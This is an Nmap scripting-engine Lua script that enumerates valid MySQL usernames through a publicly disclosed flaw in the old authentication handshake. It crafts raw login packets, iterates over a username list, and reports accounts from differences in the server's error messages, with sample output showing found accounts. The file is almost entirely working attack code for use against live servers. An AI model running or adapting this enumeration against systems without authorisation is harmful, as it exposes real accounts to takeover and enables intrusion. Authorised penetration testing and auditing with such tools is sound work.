local bin = require "bin"
local brute = require "brute"
local creds = require "creds"
local mysql = require "mysql"
local nmap = require "nmap"
local shortport = require "shortport"
local stdnse = require "stdnse"
local string = require "string"

local openssl = stdnse.silent_require "openssl"

description = [[
Performs valid user enumeration against MySQL server.

Server version 5.x are succeptible to an user enumeration
attack due to different messages during login when using 
old authentication mechanism from versions 4.x and earlier.

Original bug discovered and published by Kingcope:
http://seclists.org/fulldisclosure/2012/Dec/9

]]

---
-- @usage
-- nmap --script=mysql-enum <target>
--
-- @output
-- PORT     STATE SERVICE REASON
-- 3306/tcp open  mysql   syn-ack
-- | mysql-enum:
-- |   Accounts
-- |     admin:<empty> - Valid credentials
-- |     test:<empty> - Valid credentials
-- |     test_mysql:<empty> - Valid credentials
-- |   Statistics
-- |_    Performed 11 guesses in 1 seconds, average tps: 11
--
-- @args mysql-enum.timeout socket timeout for connecting to MySQL (default 5s)

author = "Aleksandar Nikolic"
license = "Same as Nmap--See http://nmap.org/book/man-legal.html"
categories = {"intrusive", "brute"}

portrule = shortport.port_or_service(3306, "mysql")

local arg_timeout = stdnse.parse_timespec(stdnse.get_script_args(SCRIPT_NAME .. ".timeout"))
arg_timeout = (arg_timeout or 5) * 1000

Driver = {

	new = function(self, host, port)
		local o = {}
		setmetatable(o, self)
		self.__index = self
		o.host = host
		o.port = port
		return o
	end,

	connect = function( self )
		self.socket = nmap.new_socket()
		local status, err = self.socket:connect(self.host, self.port)
		self.socket:set_timeout(arg_timeout)
		if(not(status)) then
			return false, brute.Error:new( "Couldn't connect to host: " .. err )
		end
		return true
	end,

	login = function (self, user, pass) -- pass is actually the username we want to try
		local status, response = mysql.receiveGreeting(self.socket)
		if(not(status)) then
			if string.find(response,"is blocked because of many connection errors") then
				local err = brute.Error:new( response )
				err:setAbort( true )
				return false, err
			end
			return false,brute.Error:new(response)
		end
		stdnse.print_debug( "Trying %s ...", pass)
		local auth_string = bin.pack("H","0000018d00000000") .. pass .. bin.pack("H","00504e5f5155454d4500"); -- old authentication method 
		local err
		status, err = self.socket:send(bin.pack("c",string.len(auth_string)-3) .. auth_string) --send initial auth
		status, response = self.socket:receive_bytes(0)
		if not status then
			return false,brute.Error:new( "Incorrect username" )
		end        
		if string.find(response,"Access denied for user") == nil then
			-- found it 
			return true, brute.Account:new( pass, nil, creds.State.VALID)
		else
			return false,brute.Error:new( "Incorrect username" )
		end
	end,

	disconnect = function( self )
		self.socket:close()
		return true
	end

}

action = function( host, port )

	local status, result
	local engine = brute.Engine:new(Driver, host, port)
	engine.options:setOption("passonly", true )
	engine:setPasswordIterator(brute.usernames_iterator())
	engine.options.script_name = SCRIPT_NAME
	engine.options:setTitle("Valid usernames")
	status, result = engine:start()

	return result
end
